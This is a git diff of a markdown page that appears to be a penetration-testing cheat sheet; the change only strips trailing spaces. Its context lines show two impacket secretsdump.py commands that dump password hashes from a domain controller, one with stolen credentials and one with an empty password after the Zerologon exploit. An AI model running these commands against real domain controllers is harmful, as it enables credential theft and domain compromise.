@@ -67,12 +67,12 @@ tags:
 
  > 
  > **<font color=red>python3 /opt/impacket/examples/secretsdump.py</font> myDomain<font color=red>/</font>myUser<font color=red>:</font>myPass<font color=red>@</font>\[TARGET_DC_IP\]**<br>
- > Connect to the target and dump hashes. 
+ > Connect to the target and dump hashes.
 
 
  > 
  > **<font color=red>python3 /opt/impacket/examples/secretsdump.py </font>myNetBIOSDCName<font color=red>\\$@</font>\[TARGET_DC_IP\] <font color=red>-no-pass</font>**<br>
- > Connect with empty password (after Zerologon exploit) and dump hashes. 
+ > Connect with empty password (after Zerologon exploit) and dump hashes.
 
 ---
 
